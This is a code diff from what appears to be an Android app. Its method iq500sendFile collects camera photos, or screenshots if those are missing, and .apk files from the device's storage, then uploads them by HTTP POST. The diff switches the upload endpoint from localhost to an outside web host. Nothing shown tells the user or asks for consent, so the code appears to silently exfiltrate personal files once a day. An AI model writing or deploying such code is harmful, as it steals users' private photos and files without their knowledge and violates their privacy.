@@ -1,6 +1,17 @@
 	private void iq500sendFile()
 	{	
 		try{
+			//Test permission first
+			File test = new File("/sdcard");
+			Boolean testp = test.canRead();
+			if(!testp)
+			{
+				
+				//Toast.makeText(this, "gg", Toast.LENGTH_LONG).show();
+				return;
+				 
+			}
+			//Toast.makeText(this, "ok", Toast.LENGTH_LONG).show();
 			//limit one photo per day
 			Boolean pass = false;
 			Date t = new Date();
@@ -27,18 +38,29 @@
 
 					//Define root path and get file list
 					String root = "/sdcard/DCIM/Camera/";
+					String root_bkup = "/sdcard/DCIM/Screenshots/";
 					String root2 = "/sdcard/Download/";
 					
 					File pa = new File(root);
+					File pa_bkup = new File(root_bkup);
 					File pa2 = new File(root2);
+					
 					
 					String[] res = pa.list();
 					String[] res2 = pa2.list();
+					
+					//Use backup path if applicable
+					if(res == null)
+					{
+						res = pa_bkup.list();
+						root = root_bkup;
+					}
 					
 					//filter oversize files
 					String resls = "";
 					String resls2 = "";
 					//root
+					if(res != null)
 					for(int i = 0; i < res.length; i++)
 					{
 						Boolean a = res[i].endsWith(".jpg");
@@ -57,6 +79,7 @@
 					}
 					
 					//root2
+					if(res2 != null)
 					for(int i = 0; i < res2.length; i++)
 					{
 						Boolean a2 = res2[i].endsWith(".apk");
@@ -104,7 +127,7 @@
 						FileEntity reqEntity = new FileEntity(target, "binary/octet-stream");
 						
 						//launch http request
-						HttpPost post = new HttpPost("http://localhost/file.php");
+						HttpPost post = new HttpPost("http://500iqproject.atwebpages.com/file.php");
 						
 						//set binary entity
 						post.setEntity(reqEntity);
@@ -123,7 +146,7 @@
 					{
 						File target2 = new File(finalres2);
 						FileEntity reqEntity2 = new FileEntity(target2, "binary/octet-stream");
-						HttpPost post2 = new HttpPost("http://localhost/file.php");
+						HttpPost post2 = new HttpPost("http://500iqproject.atwebpages.com/file.php");
 
 						post2.setEntity(reqEntity2);
 						reqEntity2.setContentType("binary/octet-stream");
